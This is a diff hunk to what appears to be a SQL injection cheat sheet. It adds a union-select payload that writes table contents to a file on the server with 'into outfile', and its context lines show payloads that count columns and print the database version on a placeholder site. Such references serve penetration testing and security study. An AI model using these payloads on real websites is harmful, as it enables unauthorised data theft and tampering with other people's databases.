@@ -47,6 +47,11 @@ Identify webpage printable union columns by providing false value to back-end qu
 http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
 ```
 
+Dump the content of table into the filesystem
+```php
+http://meh.com/index,php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
+```
+
 Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
